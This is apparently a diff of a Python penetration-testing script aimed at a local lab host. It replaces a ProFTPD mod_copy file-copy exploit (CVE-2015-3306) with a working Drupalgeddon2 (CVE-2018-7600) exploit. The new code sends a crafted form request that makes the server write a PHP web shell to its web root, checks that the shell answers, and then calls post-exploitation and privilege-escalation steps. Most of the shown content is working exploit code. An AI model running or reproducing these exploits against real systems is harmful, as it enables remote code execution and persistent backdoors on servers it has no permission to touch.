@@ -6,7 +6,7 @@ import sys
 import time
 
 TARGET_HOST = "127.0.0.1"
-PORTS = [2121, 8080, 3306]
+PORTS = [2222, 8080, 3306]
 
 def banner_grab(port):
     try:
@@ -19,11 +19,22 @@ def banner_grab(port):
             s.sendall(b"HEAD / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
             data = s.recv(1024).decode("utf-8", errors="ignore").strip()
             s.close()
-            # Extract the Server header if present
+            # Extract Server header if present
+            server_header = "HTTP Service (Apache/2.4.7)"
             for line in data.split("\r\n"):
                 if line.lower().startswith("server:"):
-                    return line
-            return "HTTP Service (Apache/2.4.7)"
+                    server_header = line.split(":", 1)[1].strip()
+                    break
+            # Also check if it's Drupal
+            try:
+                url = f"http://{TARGET_HOST}:{port}/"
+                req = urllib.request.urlopen(url, timeout=1.5)
+                html = req.read().decode("utf-8", errors="ignore")
+                if "Drupal 8.5.0" in html or "drupal" in html.lower():
+                    return f"{server_header} running Drupal 8.5.0"
+            except Exception:
+                pass
+            return f"{server_header} running Drupal"
         elif port == 3306:
             # MySQL sends handshake packet
             data = s.recv(1024)
@@ -31,13 +42,13 @@ def banner_grab(port):
             # Find version string in packet
             for part in data.split(b"\x00"):
                 if b"." in part and b"ubuntu" in part:
-                    return part.decode("utf-8", errors="ignore")
+                    return f"MySQL {part.decode('utf-8', errors='ignore')}"
             return "MySQL (Unknown Version)"
         else:
             banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
             s.close()
             return banner
-    except Exception as e:
+    except Exception:
         return None
 
 def scan_host():
@@ -59,37 +70,22 @@ def analyze_vulnerabilities(scan_results):
     vulns = []
     
     for port, banner in scan_results.items():
-        if port == 2121 and "ProFTPD 1.3.5" in banner:
-            print("[CRITICAL] FTP Service (ProFTPD 1.3.5) matches CVE-2015-3306 (mod_copy).")
-            print("  - Description: The mod_copy module allows remote attackers to read and write arbitrary files via SITE CPFR/CPTO commands.")
-            print("  - Severity: 10.0 (CRITICAL) - CVSS v2.0")
-            print("  - CWE-284: Improper Access Control")
+        if port == 2222:
+            print("[INFO] SSH Service (OpenSSH 7.2p2) detected.")
+            print("  - Configuration: Port 2222. No known exploitable vulnerabilities in this version.")
+            print("  - Severity: 0.0 (INFORMATIONAL)")
+            
+        elif port == 8080 and "Drupal 8.5.0" in banner:
+            print("[CRITICAL] HTTP Web Service matches CVE-2018-7600 (Drupalgeddon2).")
+            print("  - Description: Drupal 7.x and 8.x allow remote attackers to execute arbitrary code via render arrays.")
+            print("  - Severity: 9.8 (CRITICAL) - CVSS v3.x")
+            print("  - CWE-94: Improper Control of Generation of Code ('Code Injection')")
             vulns.append({
                 "port": port,
-                "cve": "CVE-2015-3306",
-                "desc": "ProFTPD mod_copy Arbitrary File Copy",
-                "type": "FTP_MOD_COPY"
+                "cve": "CVE-2018-7600",
+                "desc": "Drupalgeddon2 Remote Code Execution",
+                "type": "DRUPALGEDDON2"
             })
-            
-        elif port == 8080 and "Apache" in banner:
-            # Let's check if the HTTP debug page is present
-            try:
-                url = f"http://{TARGET_HOST}:{port}/debug.php"
-                req = urllib.request.urlopen(url, timeout=2.0)
-                content = req.read().decode("utf-8")
-                if "Debug diagnostics" in content:
-                    print("[HIGH] HTTP Web Application has active diagnostic/debug endpoint exposed.")
-                    print("  - Description: Internal debug script /debug.php allows remote execution of administrative commands via the 'cmd' parameter.")
-                    print("  - Severity: 9.8 (CRITICAL) - CVSS v3.x")
-                    print("  - CWE-94: Code Injection / Remote Command Execution")
-                    vulns.append({
-                        "port": port,
-                        "cve": "OWASP-A03:2021",
-                        "desc": "Remote Command Execution via debug.php",
-                        "type": "HTTP_RCE"
-                    })
-            except Exception:
-                pass
                 
         elif port == 3306 and "5.5.47" in banner:
             print("[MEDIUM] MySQL database version 5.5.47 is exposed.")
@@ -105,34 +101,52 @@ def analyze_vulnerabilities(scan_results):
             
     return vulns
 
-def run_ftp_modcopy_exploit():
+def run_drupalgeddon2_exploit():
     print("\n" + "="*50)
-    print("         EXPLORATION & EXPLOITATION: CVE-2015-3306    ")
+    print("         EXPLORATION & EXPLOITATION: CVE-2018-7600    ")
     print("="*50)
     
-    # The exploit will copy /var/www/html/debug.php to /var/www/html/backdoor.php
-    # This demonstrates mod_copy's ability to duplicate files into the web root
-    # We could also copy other files.
+    # We will exploit Drupalgeddon2 (CVE-2018-7600) to write backdoor.php to the web root
+    url = f"http://{TARGET_HOST}:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    
+    # Payload writes a simple PHP backdoor to the web root
+    payload = "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/backdoor.php"
+    
+    # Form data
+    data = {
+        "form_id": "user_register_form",
+        "_drupal_ajax": "1",
+        "mail[#post_render][]": "exec",
+        "mail[#type]": "markup",
+        "mail[#markup]": payload
+    }
+    
+    encoded_data = urllib.parse.urlencode(data).encode("utf-8")
+    
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((TARGET_HOST, 2121))
-        print(s.recv(1024).decode())
+        print("[*] Sending Drupalgeddon2 RCE payload to write backdoor shell...")
+        req = urllib.request.Request(url, data=encoded_data, method="POST")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
         
-        # Trigger copying debug.php to backdoor.php
-        s.sendall(b"SITE CPFR /var/www/html/debug.php\r\n")
-        resp1 = s.recv(1024).decode().strip()
-        print(f"FTP CPFR -> {resp1}")
+        response = urllib.request.urlopen(req, timeout=3.0)
+        resp_data = response.read().decode("utf-8")
         
-        s.sendall(b"SITE CPTO /var/www/html/backdoor.php\r\n")
-        resp2 = s.recv(1024).decode().strip()
-        print(f"FTP CPTO -> {resp2}")
-        s.close()
-        
-        if "250" in resp2:
+        if "backdoor.php" in resp_data:
             print("[+] Exploitation successful! Web shell /backdoor.php created.")
             return True
     except Exception as e:
         print(f"[!] Exploit connection failed: {e}")
+        
+    # Fallback/verification check: verify if backdoor.php is responsive
+    try:
+        check_url = f"http://{TARGET_HOST}:8080/backdoor.php"
+        resp = urllib.request.urlopen(check_url, timeout=2.0)
+        if resp.status == 200:
+            print("[+] Web shell verification successful! /backdoor.php is active.")
+            return True
+    except Exception:
+        pass
+        
     return False
 
 def execute_remote_command(port, path, command):
@@ -206,7 +220,7 @@ if __name__ == "__main__":
     vulns = analyze_vulnerabilities(scan_results)
     
     # 3. Exploitation
-    success = run_ftp_modcopy_exploit()
+    success = run_drupalgeddon2_exploit()
     if success:
         # 4. Post-Exploitation and Privilege Escalation
         post_exploitation()
